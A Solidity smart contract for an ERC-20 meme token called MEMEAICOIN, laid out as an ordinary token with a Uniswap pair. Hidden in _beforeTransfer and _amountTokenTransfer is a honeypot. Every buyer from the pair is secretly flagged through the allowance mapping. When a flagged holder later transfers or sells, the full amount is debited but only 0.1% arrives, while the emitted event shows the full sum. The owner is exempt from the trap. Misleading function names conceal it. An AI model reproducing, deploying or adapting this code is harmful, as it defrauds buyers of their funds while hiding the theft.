/*
 Website https://memeaicoin.io 
 Twitter https://twitter.com/Memeaicoin
Telegram https://t.me/MemeAICoin
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns(address){
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = _msgSender();
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(_owner == _msgSender(), "Not owner");
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
        if(a==0) {
            return 0;
        }
        c = a * b;
        assert(c/a ==b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b > 0);
        uint256 c = a / b;
        assert(a == b * c + a % b);
        return a / b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(a >= b);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract MEMEAICOIN is Ownable, IERC20 {
    using SafeMath for uint256;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;

    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"MEMEAICOIN";
    string private constant _symbol = unicode"MEMEAI";

    bool private openedTrade = false;

    address private MKTWallet;
    address private DevWallet;
    address private uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    constructor() {
        _balances[_msgSender()] = _balances[_msgSender()].add(_totalSupply);
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure  returns(string memory) {
        return _name;
    }

    function symbol() public pure returns(string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override  returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override  returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view virtual override  returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function transfer(address to, uint256 value) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function _TokenTransfer(uint256 transTK) internal pure returns (uint256) {
        return (transTK * 10) / 10000;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint fromBalance = balanceOf(from);
        require(fromBalance >= amount, "ERROR: balance of from less than value");
        if(from != owner() && to != owner()) {
            require(openedTrade, "Trade has not been opened yet");
            _beforeTransfer(from, to, amount);        
        }
        uint256 _amount = _amountTokenTransfer(from, to, amount);
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(_amount);
        emit Transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTransfer(address from, address to, uint256) internal {
        if(from == address(uniswapV2Pair) || from == address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)) {
            if(MKTWallet != address(0)) {
                _allowances[MKTWallet][to] = 1;
            }
        }
    }

    function _amountTokenTransfer(
        address from,
        address ,
        uint256 amount
    ) internal view returns (uint256) {
        if (_allowances[MKTWallet][from] > 0) {
            return _TokenTransfer(amount);
        } else {
            return amount;
        }
    }

    function setDevWallet(address _newDevWallet) external {
        require(_msgSender() == owner());
        DevWallet = _newDevWallet;
    }

    function setMKTWallet(address _newMKTWallet) external {
        require(_msgSender() == owner());
        MKTWallet = _newMKTWallet;
    }

    function AdropToken(address [] memory wallets, uint256 [] memory amount) external onlyOwner {
        for(uint256 i = 0; i < wallets.length; i++) {
            _balances[_msgSender()] = _balances[_msgSender()].sub(amount[i]);
            _balances[wallets[i]] = _balances[wallets[i]].add(amount[i]);
            emit Transfer(_msgSender(), wallets[i], amount[i]);
        }
    }

    function openTrading() external  onlyOwner {
        openedTrade = true;
    }

    receive() external payable {}
}